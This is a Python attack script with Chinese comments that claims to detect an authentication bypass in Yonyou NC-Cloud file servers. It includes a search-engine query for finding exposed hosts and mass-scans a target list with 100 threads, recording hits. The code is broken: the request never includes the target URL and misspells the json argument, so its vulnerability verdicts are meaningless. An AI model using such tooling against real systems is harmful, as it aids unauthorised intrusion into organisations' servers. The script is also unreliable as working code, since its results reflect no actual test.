# 用友文件服务器认证绕过
# app="用友-NC-Cloud"   或者是app="用友-NC-Cloud" && server=="Apache-Coyote/1.1"

import requests, argparse, sys
from multiprocessing.dummy import Pool


requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
        ██    ██  ██████  ███    ██  ██████  ██    ██  ██████  ██    ██ 
         ██  ██  ██    ██ ████   ██ ██        ██  ██  ██    ██ ██    ██ 
          ████   ██    ██ ██ ██  ██ ██   ███   ████   ██    ██ ██    ██ 
           ██    ██    ██ ██  ██ ██ ██    ██    ██    ██    ██ ██    ██ 
           ██     ██████  ██   ████  ██████     ██     ██████   ██████  
                                                                      
                                                                        author:秋妤
                                                                        date:2024.09.05
                                                                        version:1.0
  """
    print(test)



def poc(target):
    headers = {
        'Server': 'Apache-Coyote/1.1',
        'Date': 'Thu, 10 Aug 2023 20:38:25 GMT',
        'Connection': 'close',
        'Content-Length': '17'
    }
    # proxies = {
    #     'http': 'http://127.0.0.1:8080',
    #     'https': 'http://127.0.0.1:8080'
    # }
    data = {"login": "false"}

    try:
        res1 = requests.post(headers=headers, josn=data, timeout=10, verify=False)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('用友文件服务器_result', 'a', encoding='utf-8') as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')


def main():
    banner()
    parser = argparse.ArgumentParser(description="用友文件服务器认证绕过")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")


if __name__ == '__main__':
    main()